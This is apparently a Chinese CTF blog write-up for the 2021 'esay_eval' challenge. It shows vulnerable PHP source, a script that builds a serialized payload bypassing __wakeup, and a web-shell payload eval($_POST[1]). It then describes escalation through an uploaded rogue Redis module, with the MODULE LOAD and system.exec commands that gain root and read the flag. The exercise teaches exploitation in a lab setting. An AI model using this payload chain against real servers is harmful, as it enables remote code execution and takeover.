---
title: 天翼杯2021 esay_eval
date: 2022-05-11 20:41:07
toc: false
tags: 
    - CTF
categories: CTF
my: esay_eval
---

题目源码：

``` php
<?php
class A{
    public $code = "";
    function __call($method,$args){
        eval($this->code);
        
    }
    function __wakeup(){
        $this->code = "";
    }
}

class B{
    function __destruct(){
        echo $this->a->a();
    }
}
if(isset($_REQUEST['poc'])){
    preg_match_all('/"[BA]":(.*?):/s',$_REQUEST['poc'],$ret);
    if (isset($ret[1])) {
        foreach ($ret[1] as $i) {
            if(intval($i)!==1){
                exit("you want to bypass wakeup ? no !");
            }
        }
        unserialize($_REQUEST['poc']);    
    }


}else{
    highlight_file(__FILE__);
}
```

上来是个简单（bushi）的反序列化拿shell，但是A类里面的`__wakeup()`函数会把我们传进去的`$code`属性置为空，这里我们只需要让`__wakeup()`函数失效，CVE-2016-7124:当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。(也可上b站看[视频学习](https://www.bilibili.com/video/BV1Z54y1U7up?spm_id_from=333.880.my_history.page.click)）

```php
<?php
class a{
	function __construct(){
		$this->code = $code;
	}
}
class B{
	function __construct(){
		$this->a = $a;
	}
}
$a = new a();
$a->code = 'eval($_POST[1]);';
$b = new B();
$b->a = $a;
echo serialize($b);
?>
```

得到了payload：?poc=O:1:"B":1:{s:1:"a";O:1:"a":2:{s:4:"code";s:16:"eval($_POST[1]);";}}直接不犹豫连接蚁剑.当我们以为就此结束可以拿到flag我们点击根目录发现这个shell没有访问权限，但是在/var/www/html中有上传权限，所以可以通过上传恶意的so文件，通过蚁剑的redis管理插件，进行ssrf，然后包含恶意so文件（提供一[下载地址](https://github.com/Dliv3/redis-rogue-server)）

![image.png](https://s2.loli.net/2022/05/11/jnw9QXU8NWF5eK1.png)

**注**：因为插件市场这个东西，国内基本是访问不到，我在用蚁剑访问的时候，就一直转圈圈转不出来，所以可以使用github的插件仓库下载插件，然后手动放到**antSword-master/antData/pulgins**中，再次打开蚁剑后，会自动加载该插件（或者科学上网）

我们上传一个exp.so文件

![image.png](https://s2.loli.net/2022/05/11/hBI54UzwPbXysgo.png)

![image.png](https://s2.loli.net/2022/05/11/39SgHdzWhoZRnEJ.png)

密码是根据/var/www/html中有个config.php.swp文件，其中有密码

![image.png](https://s2.loli.net/2022/05/11/pcECsYOIgrRfPv5.png)

![image.png](https://s2.loli.net/2022/05/11/4w9d3VIzTHDgM1x.png)

然后执行指令

![image.png](https://s2.loli.net/2022/05/11/8CGLhlsyeDYir3N.png)

```
MODULE LOAD /var/www/html/exp.so
system.exec "whoami"
```

这里我们发现是root权限

![image.png](https://s2.loli.net/2022/05/11/lAhN2fa8yWSCPwk.png)

直接看根目录   然后找到flag

```
system.exec "ls /"
system.exec "cat /flag*"
```
